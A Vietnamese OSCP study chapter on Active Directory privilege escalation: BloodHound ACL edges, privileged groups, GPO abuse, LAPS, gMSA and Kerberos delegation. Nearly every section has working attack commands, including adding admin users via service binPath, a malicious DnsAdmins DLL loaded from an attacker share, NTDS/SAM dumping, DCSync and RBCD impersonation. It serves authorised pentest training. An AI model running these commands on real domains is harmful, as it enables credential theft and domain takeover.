# 04 — Leo thang trong domain: ACL, nhóm đặc quyền, LAPS, gMSA, Delegation

Phần này là "trái tim" của các chuỗi tấn công AD trong OSCP: BloodHound chỉ ra
một cạnh (edge), bạn phải biết **cách khai thác** cạnh đó trong lab.

> Tất cả kỹ thuật dưới đây chỉ dùng trong **lab luyện thi / pentest có ủy quyền**.
> Luôn ghi lại thay đổi để **hoàn nguyên (cleanup)** sau khi khai thác.

---

## 1. Hiểu ACL/ACE trong AD

Mỗi object AD (user, group, computer, OU, GPO, domain) có một **DACL** = danh
sách ACE "principal X có quyền Y trên object này". Các quyền đáng chú ý khi tìm
đường leo thang:

| Quyền (edge BloodHound) | Trên object | Ý nghĩa khi khai thác |
|-------------------------|-------------|-----------------------|
| **GenericAll** (Full control) | User | Reset mật khẩu / targeted Kerberoast / shadow credentials |
| | Group | Tự thêm vào nhóm |
| | Computer | RBCD / shadow credentials / đọc LAPS |
| | Domain | Có thể tự cấp quyền replication (DCSync) |
| **GenericWrite** / WriteProperty | User | Ghi SPN (targeted Kerberoast), ghi `msDS-KeyCredentialLink` (shadow creds), logon script |
| | Computer | Ghi `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD), shadow creds |
| | Group | Thêm thành viên |
| **ForceChangePassword** | User | Đặt mật khẩu mới không cần mật khẩu cũ |
| **AddMember / AddSelf** | Group | Tự thêm mình vào nhóm |
| **WriteDacl** | Bất kỳ | Tự ghi thêm ACE GenericAll cho mình |
| **WriteOwner / Owns** | Bất kỳ | Đổi owner → owner có quyền ghi DACL → GenericAll |
| **AllExtendedRights** | User / Domain | ForceChangePassword / quyền replication / đọc LAPS |
| **DS-Replication-Get-Changes(-All)** | Domain | *DCSync* — xem [file 08](08-domain-admin-persistence.md) |
| **ReadLAPSPassword** | Computer | Đọc mật khẩu admin local |
| **ReadGMSAPassword** | gMSA | Đọc hash tài khoản dịch vụ |
| **AddKeyCredentialLink** | User/Computer | Shadow credentials |
| **GPO: GenericWrite/WriteDacl** | GPO | Sửa GPO → tác động mọi máy áp dụng GPO |

> **Thừa kế:** quyền trên **OU** hoặc **group** lan xuống object con / thành viên.
> Có GenericAll trên một OU ⇒ kiểm soát được mọi user bên trong OU đó.

Công cụ chính:
- **Linux:** `bloodyAD` (gọn nhất), `impacket-dacledit`, `impacket-owneredit`,
  `net rpc`, `pywhisker`, `certipy`.
- **Windows:** `PowerView`, module `ActiveDirectory`, `net`.

BloodHound: chuột phải lên cạnh → **Help → Abuse Info** sẽ in luôn lệnh cho cả
Windows lẫn Linux — dùng đó làm nguồn chính.

---

## 2. Khai thác từng loại cạnh

### 2.1. ForceChangePassword / GenericAll trên user → đặt lại mật khẩu

Ưu tiên kỹ thuật **không phá tài khoản** (shadow credentials / targeted
Kerberoast) khi có thể. Reset mật khẩu phù hợp với lab:

```bash
bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set password target 'NewP@ss123!'
net rpc password "target" 'NewP@ss123!' -U "$DOMAIN"/"$USER"%"$PASS" -S $DC
```

```powershell
PS> $pw = ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force
PS> Set-DomainUserPassword -Identity target -AccountPassword $pw      # PowerView
```

**Lab:** HTB *Forest* (`Exchange Windows Permissions` → WriteDacl), HTB *Cascade*,
HTB *Intelligence*.

### 2.2. AddMember / GenericWrite trên group → tự thêm vào nhóm

```bash
bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add groupMember 'IT Admins' $USER
net rpc group addmem "IT Admins" "$USER" -U "$DOMAIN"/"$USER"%"$PASS" -S $DC
```

```powershell
PS> Add-DomainGroupMember -Identity 'IT Admins' -Members alice
```

> Token hiện tại chưa có nhóm mới — xin lại TGT / đăng nhập lại. Mỗi lệnh
> NetExec/Impacket là một phiên mới nên có hiệu lực ngay.

### 2.3. WriteOwner → WriteDacl → GenericAll (chuỗi)

```bash
# 1) Đặt mình làm owner
impacket-owneredit -action write -new-owner $USER -target target_obj "$DOMAIN/$USER:$PASS" -dc-ip $DC
# 2) Owner tự cấp Full Control
impacket-dacledit -action write -rights FullControl -principal $USER -target target_obj "$DOMAIN/$USER:$PASS" -dc-ip $DC
# bloodyAD tương đương:
bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set owner target_obj $USER
bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add genericAll target_obj $USER
```

```powershell
PS> Set-DomainObjectOwner -Identity target_obj -OwnerIdentity alice
PS> Add-DomainObjectAcl -TargetIdentity target_obj -PrincipalIdentity alice -Rights All
```

**Lab:** HTB *Administrator* (WriteOwner chuỗi nhiều user), HTB *Blackfield*
(WriteOwner trên `audit2020`).

### 2.4. Shadow Credentials (AddKeyCredentialLink) — ưu tiên dùng

**Giải thích:** Ghi một cặp khóa public vào thuộc tính `msDS-KeyCredentialLink`
của đối tượng → sau đó dùng khóa private xác thực qua **PKINIT** để lấy TGT và
NT hash của đối tượng, **không cần đổi mật khẩu**. Yêu cầu: có ADCS/PKINIT trong
domain (đa số có) và quyền ghi thuộc tính đó (GenericWrite/GenericAll/AddKeyCredentialLink).

```bash
certipy shadow auto -u $USER@$DOMAIN -p $PASS -account target -dc-ip $DC
# → in NT hash của 'target' và lưu TGT (.ccache)

# pywhisker (thủ công)
pywhisker -d $DOMAIN -u $USER -p $PASS --target target --action add
# → file .pfx + mật khẩu; rồi:
gettgtpkinit.py -cert-pfx out.pfx -pfx-pass '<pw>' $DOMAIN/target target.ccache
export KRB5CCNAME=target.ccache
getnthash.py -key <AS-REP-key> $DOMAIN/target        # hoặc dùng certipy auth
```

```powershell
PS> .\Whisker.exe add /target:target
PS> .\Rubeus.exe asktgt /user:target /certificate:<b64> /password:<pw> /getcredentials
```

**Lab:** HTB *Support* (GenericWrite → shadow cred / RBCD), HTB *Administrator*,
PG *Resourced*, Vulnlab *Hybrid*.

### 2.5. Targeted Kerberoast (GenericWrite/WriteSPN trên user)

Xem [file 03 §6](03-co-credential-enum.md#6-kerberoasting). Gán SPN tạm → roast → xóa SPN.

```bash
python3 targetedKerberoast.py -v -d $DOMAIN -u $USER -p $PASS --dc-ip $DC
```

---

## 3. Nhóm đặc quyền (thường là đích của một ACL edge)

| Nhóm | Khả năng |
|------|----------|
| **Domain Admins / Enterprise Admins / Administrators** | Toàn quyền domain/forest |
| **Account Operators** | Sửa hầu hết user/group (trừ nhóm admin được bảo vệ) → tạo/đổi mật khẩu |
| **Backup Operators** | Quyền `SeBackup`/`SeRestore` → đọc SAM/SYSTEM, copy `NTDS.dit` từ DC → DCSync offline |
| **Server Operators** | Quản lý service trên DC → đổi binPath của service chạy SYSTEM |
| **Print Operators** | `SeLoadDriver` trên DC |
| **DnsAdmins** | Nạp DLL tùy ý vào dịch vụ DNS (chạy SYSTEM trên DC) — đã bị vá một phần |
| **Exchange Windows Permissions** | Thường có WriteDacl trên domain → tự gán DCSync |
| **Remote Management Users** | Đăng nhập WinRM (evil-winrm) |
| **Remote Desktop Users** | RDP |

### Backup Operators → DC (hay gặp)

```bash
# Dùng quyền SeBackup từ xa để tải SAM/SYSTEM/SECURITY hoặc NTDS.dit
nxc smb $DC -u $USER -p $PASS -M backup_operator        # kiểm tra & dump từ xa (NetExec mới)
# Thủ công từ Windows (evil-winrm):
PS> reg save HKLM\SAM sam.hive ; reg save HKLM\SYSTEM system.hive
# Hoặc dùng diskshadow + robocopy copy NTDS.dit (chi tiết file 08)
```

### Server Operators → SYSTEM trên DC

```powershell
PS> sc.exe config browser binPath= "C:\Windows\System32\cmd.exe /c net user admin2 P@ss123! /add && net localgroup administrators admin2 /add"
PS> sc.exe start browser
```

### DnsAdmins

```bash
# Tạo DLL chạy lệnh → ép dịch vụ DNS nạp
msfvenom -p windows/x64/exec CMD='net group "Domain Admins" alice /add /domain' -f dll -o evil.dll
# Đặt DLL lên share, rồi (trên máy có quyền):
PS> dnscmd DC01 /config /serverlevelplugindll \\LHOST\share\evil.dll
PS> sc.exe \\DC01 stop dns ; sc.exe \\DC01 start dns
```

**Lab:** Backup Operators — HTB *Blackfield*, PG *Hutch*; Server Operators —
HTB *Blackfield* (phần sau); DnsAdmins — THM *Attacking Kerberos*/*Enterprise*.

---

## 4. GPO Abuse (GenericWrite/WriteDacl trên GPO)

**Giải thích:** GPO áp xuống mọi máy/user trong OU liên kết. Có quyền ghi GPO ⇒
thêm scheduled task / immediate task / startup script chạy lệnh với quyền SYSTEM
hoặc trên mọi máy áp dụng GPO.

```bash
# Linux
pygpoabuse "$DOMAIN/$USER:$PASS" -gpo-id "<GPO-GUID>" -command 'net localgroup administrators alice /add'
```

```powershell
PS> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount alice --GPOName "Default Domain Policy"
PS> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "upd" --Author admin --Command "cmd.exe" --Arguments "/c net user ..." --GPOName "..."
PS> gpupdate /force       # trên máy đích, hoặc đợi chu kỳ refresh (90 phút)
```

**Lab:** THM *Exploiting AD*, GOAD.

---

## 5. LAPS (Local Administrator Password Solution)

**Giải thích:** LAPS tự đặt mật khẩu admin local ngẫu nhiên cho mỗi máy, lưu
trong thuộc tính `ms-Mcs-AdmPwd` (LAPS v1) hoặc `msLAPS-Password` (v2) của object
máy. Chỉ principal được ủy quyền mới đọc được (edge **ReadLAPSPassword**).

```bash
nxc ldap $DC -u $USER -p $PASS -M laps
nxc smb  $DC -u $USER -p $PASS -M laps                    # có thể đăng nhập luôn
bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get search -f "(ms-Mcs-AdmPwd=*)" -k ms-Mcs-AdmPwd,sAMAccountName
python3 pyLAPS.py --action get -d $DOMAIN -u $USER -p $PASS
```

```powershell
PS> Get-DomainComputer -Identity WS01 -Properties ms-Mcs-AdmPwd
PS> Get-LAPSPasswords        # module
```

Dùng mật khẩu đó đăng nhập local admin:

```bash
nxc smb WS01 -u Administrator -p '<laps_pass>' --local-auth
```

**Lab:** HTB *Hathor*, PG *Hutch*, Vulnlab *Hybrid*; BloodHound → "Shortest paths
to systems where LAPS is readable".

---

## 6. gMSA (Group Managed Service Account)

**Giải thích:** gMSA có mật khẩu do DC tự quản lý (blob `msDS-ManagedPassword`).
Principal nằm trong `PrincipalsAllowedToRetrieveManagedPassword` (edge
**ReadGMSAPassword**) đọc được blob → tính ra NT hash → PtH.

```bash
nxc ldap $DC -u $USER -p $PASS --gmsa
python3 gMSADumper.py -u $USER -p $PASS -d $DOMAIN
bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object 'svc_gmsa$' --attr msDS-ManagedPassword
```

Có hash gMSA → PtH / Silver ticket. Nhiều gMSA thuộc nhóm đặc quyền → tới DA.

**Lab:** HTB *Intelligence* (gMSA `svc_int` → constrained delegation → DC), HTB
*Flight*, Vulnlab *Hybrid*.

---

## 7. Delegation (Kerberos)

### 7.1. Unconstrained Delegation

**Giải thích:** Máy bật unconstrained delegation lưu **TGT của mọi user kết nối
tới nó** trong bộ nhớ. Nếu bạn là admin trên máy đó, trích TGT ra; kết hợp
**coerce** để ép DC (`DC01$`) kết nối → lấy TGT của DC → DCSync.

```bash
impacket-findDelegation $DOMAIN/$USER:$PASS -dc-ip $DC
nxc ldap $DC -u $USER -p $PASS --trusted-for-delegation
```

```powershell
# Trên máy unconstrained, với quyền admin
PS> .\Rubeus.exe monitor /interval:5 /nowrap          # lắng nghe TGT mới
# Ép DC kết nối tới máy này (file 01 §8):
# python3 printerbug.py corp/user:pass@DC01 UNCONSTRAINED_HOST
PS> .\Rubeus.exe ptt /ticket:<base64_TGT_của_DC01$>
PS> mimikatz # lsadump::dcsync /domain:corp.local /user:corp\krbtgt
```

**Lab:** HTB *Intelligence* (gián tiếp), GOAD; HTB Academy module Kerberos.

### 7.2. Constrained Delegation (S4U)

**Giải thích:** Tài khoản có `msDS-AllowedToDelegateTo` được phép mạo danh user
tới **một số service cụ thể**. Với `S4U2Self` + `S4U2Proxy` bạn xin ticket với
danh tính bất kỳ (kể cả `Administrator`) tới service đó.

```bash
impacket-findDelegation $DOMAIN/$USER:$PASS -dc-ip $DC     # tìm AllowedToDelegateTo
# Có hash/credential của tài khoản được ủy quyền:
impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator -dc-ip $DC "$DOMAIN/svc_deleg:$PASS"
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc01.corp.local
```

```powershell
PS> .\Rubeus.exe s4u /user:svc_deleg /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/dc01.corp.local /ptt
```

> Mẹo "alternate service": xin ticket `cifs/...` rồi đổi service name sang
> `host/`, `ldap/`, `http/` (cùng tài khoản máy) để mở rộng khả năng.

**Lab:** HTB *Intelligence*, HTB *Scrambled*, GOAD.

### 7.3. Resource-Based Constrained Delegation (RBCD)

**Giải thích:** Nếu bạn ghi được `msDS-AllowedToActOnBehalfOfOtherIdentity` trên
máy đích (cần GenericWrite/GenericAll trên object máy đó), bạn khai báo "máy X của
tôi được phép mạo danh user tới máy đích". Tạo máy X bằng MachineAccountQuota
(mặc định 10), rồi S4U lấy ticket Administrator tới máy đích.

```bash
# 1) Tạo một computer account (nếu MAQ>0)
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Evil123!' "$DOMAIN/$USER:$PASS" -dc-ip $DC
#    (hoặc: nxc ldap $DC -u $USER -p $PASS -M add-computer)

# 2) Ghi RBCD trên máy đích
impacket-rbcd -action write -delegate-from 'EVIL$' -delegate-to 'TARGET$' "$DOMAIN/$USER:$PASS" -dc-ip $DC
#    bloodyAD: bloodyAD ... add rbcd 'TARGET$' 'EVIL$'

# 3) S4U lấy ticket mạo danh Administrator tới TARGET
impacket-getST -spn cifs/target.corp.local -impersonate Administrator -dc-ip $DC "$DOMAIN/EVIL$:Evil123!"
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass target.corp.local
```

```powershell
PS> .\Rubeus.exe hash /password:Evil123! /user:EVIL$        # lấy RC4 của máy mới
PS> Set-DomainRBCD -Identity TARGET$ -DelegateFrom EVIL$    # PowerView
PS> .\Rubeus.exe s4u /user:EVIL$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /ptt
```

**Lab:** HTB *Support* (GenericWrite computer → RBCD → DC), PG *Resourced*, HTB
*Intelligence*, Vulnlab *Hybrid*.

---

## Checklist leo thang trong domain

- [ ] BloodHound: Outbound Object Control của user — có edge nào?
- [ ] Reset password / add member / shadow cred / targeted kerberoast theo edge
- [ ] WriteOwner → WriteDacl → GenericAll chuỗi
- [ ] Nhóm đặc quyền (Backup/Server/Account Operators, Exchange perms, DnsAdmins)
- [ ] GPO ghi được?
- [ ] LAPS / gMSA đọc được?
- [ ] Delegation: unconstrained / constrained / RBCD
- [ ] MachineAccountQuota > 0? → RBCD, shadow cred
- [ ] Sau mỗi lần có credential/quyền mới → BloodHound lại
